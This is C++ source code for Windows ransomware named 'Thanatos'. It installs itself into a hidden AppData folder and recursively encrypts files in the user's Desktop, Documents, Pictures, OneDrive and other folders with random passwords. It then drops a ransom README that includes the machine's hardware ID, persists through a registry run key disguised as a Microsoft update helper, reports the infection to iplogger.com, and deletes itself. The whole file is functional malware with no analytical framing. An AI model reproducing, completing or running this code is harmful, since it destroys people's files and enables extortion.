#include <Windows.h>
#include <fstream>
#include <string.h>  
#include <locale.h>  
#include <wchar.h>
#include <stdio.h>
#include <stdlib.h>
#include <cassert> 

#include "Utils.h"
#include "EncryptFile.h"
#include "Strings.h"
#include "HTTP.h"

Strings strings;

void CreateFinalFile()
{
	Utils utils;
	Strings strings;
	HTTP http;

	string text_final_file = 
		utils.base64_decode(strings.finalMessage())
		+ (string)utils.getHWID() 
		+ utils.base64_decode(strings.endfinalmessage());

	utils.writeFile(string("C:\\Users\\" + utils.getUserName() + "\\Desktop\\README.txt"), text_final_file);

	utils.AddToRegistry("Microsoft Update System Web-Helper", string("C:\\Windows\\System32\\notepad.exe C:\\Users\\" + utils.getUserName() + "\\Desktop\\README.txt"));

	ShellExecuteA(NULL, 0, "notepad.exe", string("C:\\Users\\" + utils.getUserName() + "\\Desktop\\README.txt").c_str(), 0, SW_SHOW);

	http.Request("iplogger.com", "/1CUTM6", "", "GET");
}

void CheckDirectory(char* szInDirName)
{
	EncryptFileClass encf;

	Utils utils;

    WIN32_FIND_DATA ffd;
    HANDLE hFind;

    char szFind[MAX_PATH + 1];
    char szInFileName[MAX_PATH + 1];

    lstrcpy(szFind, szInDirName);
    lstrcat(szFind, "\\*.*");

    hFind = FindFirstFile(szFind, &ffd);

    do
    {
		char* password = utils.getRandomNumbers(20);

        lstrcpy(szInFileName, szInDirName);
        lstrcat(szInFileName, "\\");
        lstrcat(szInFileName, ffd.cFileName);

        if(ffd.dwFileAttributes & 0x00000010)
        {
			if(lstrcmp(ffd.cFileName, ".") == 0 ||
				lstrcmp(ffd.cFileName, "..") == 0) continue;

			CheckDirectory(szInFileName);
        }
   
        std::string::size_type idx;

		idx = string(ffd.cFileName).rfind('.');

		if(idx != std::string::npos)
		{
			encf.Encrypt(szInFileName, password);
		}
    }
    while(FindNextFile(hFind, &ffd));

    FindClose(hFind);
}

void Thanatos()
{
	Utils utils;

	CheckDirectory((char*)string("C:\\Users\\"+ utils.getUserName() +"\\Desktop").c_str());
	CheckDirectory((char*)string("C:\\Users\\"+ utils.getUserName() +"\\Documents").c_str());
	CheckDirectory((char*)string("C:\\Users\\"+ utils.getUserName() +"\\Downloads").c_str());
	CheckDirectory((char*)string("C:\\Users\\"+ utils.getUserName() +"\\Favourites").c_str());
	CheckDirectory((char*)string("C:\\Users\\"+ utils.getUserName() +"\\Music").c_str());
	CheckDirectory((char*)string("C:\\Users\\"+ utils.getUserName() +"\\OneDrive").c_str());
	CheckDirectory((char*)string("C:\\Users\\"+ utils.getUserName() +"\\Pictures").c_str());
	CheckDirectory((char*)string("C:\\Users\\"+ utils.getUserName() +"\\Videos").c_str());

	CreateFinalFile();

	utils.Suicide();
}

void Install()
{
	Utils utils;

	char thisExe[MAX_PATH] = "";
	string folder = "C:\\Users\\" + utils.getUserName() + "\\AppData\\Roaming\\" + utils.getRandomNumbers(15);
	string file = utils.getRandomNumbers(10) + (string)".exe";

	CreateDirectoryA(folder.c_str(), NULL);
	SetFileAttributesA(folder.c_str(), FILE_ATTRIBUTE_HIDDEN);

	GetModuleFileNameA(NULL, thisExe, MAX_PATH);
	CopyFileA(thisExe, string(folder + "\\" + file).c_str(), TRUE);

	ShellExecuteA(NULL, 0, string(folder + "\\" + file).c_str(), "", 0, SW_HIDE);

	utils.Suicide();
}


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	Utils utils;
	string path = utils.GetFullPathFromProcId(GetCurrentProcessId());
	int pos = path.find("AppData\\Roaming");

	if (pos == -1)
	{
		Install();
	}
	else
	{
		Thanatos();
	}

	return 0;
}